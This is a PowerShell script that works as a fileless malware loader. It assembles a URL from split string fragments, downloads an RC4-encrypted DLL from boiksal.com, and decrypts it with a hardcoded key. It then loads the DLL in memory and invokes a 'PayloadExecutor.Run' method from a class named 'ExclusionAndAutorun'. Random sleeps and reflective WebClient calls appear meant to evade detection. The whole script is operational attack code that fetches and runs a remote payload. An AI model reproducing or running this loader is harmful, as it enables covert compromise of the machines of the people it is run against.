function t {
    [guid]::NewGuid() | Out-Null
    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
}

t

function s {
    param($parts)
    return ($parts -join '')
}

function RC4 {
    param(
        [byte[]]$data,
        [byte[]]$key
    )
    $S = 0..255
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
        $tmp = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $tmp
    }
    $i2 = 0; $j2 = 0
    $out = New-Object byte[] $data.Length
    for ($k = 0; $k -lt $data.Length; $k++) {
        $i2 = ($i2 + 1) % 256
        $j2 = ($j2 + $S[$i2]) % 256
        $tmp = $S[$i2]; $S[$i2] = $S[$j2]; $S[$j2] = $tmp
        $idx = ($S[$i2] + $S[$j2]) % 256
        $out[$k] = $data[$k] -bxor $S[$idx]
    }
    return $out
}

# Hardcoded argument for DLL invocation
$DllArg = '0x8c41db6c'

# Download and decrypt the DLL
t
$wcType = [Net.WebClient]
$ctor = $wcType.GetConstructor(@())
function w {
    $cli = $ctor.Invoke(@())
    $hdr = New-Object System.Net.WebHeaderCollection
    $wcType.GetProperty('Headers').SetValue($cli, $hdr, $null)
    $cli.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1')
    return $cli
}

function downloadData {
    param(
        [string]$url
    )
    t
    $c = w
    $bytes = $wcType.GetMethod('DownloadData', [string]).Invoke($c, @($url))
    $c.Dispose()
    Write-Host "[+] Fetched $url → $($bytes.Length) bytes"
    return [byte[]]$bytes
}
$baseParts = @('https', '://', 'boi','ksal', '.com')
$urlDll = s($baseParts + @('/apis', '/b', '/b'))
$keyBytes = [Text.Encoding]::ASCII.GetBytes('Piv@ass!')

t
$encDll = downloadData $urlDll
$dllBytes = RC4 $encDll $keyBytes
Write-Host "[+] Decrypted DLL bytes: $($dllBytes.Length)"
$hdr = ($dllBytes[0..1] -join ',')
Write-Host "[!] DLL header bytes → $hdr"

t
try {
    $assembly = [Reflection.Assembly]::Load([byte[]]$dllBytes)
    Write-Host "[+] Loaded assembly: $($assembly.FullName)"
} catch {
    Write-Host "[!] Assembly.Load failed: $_"
    exit 1
}

# Invoke the payload method with hardcoded argument
$typeName = 'ExclusionAndAutorun.PayloadExecutor'
$method = $assembly.GetType($typeName).GetMethod('Run')
Write-Host "[+] Invoking payload with argument: $DllArg"
t
$result = $method.Invoke($null, @($DllArg))
Write-Host "[+] Payload result: $result"

        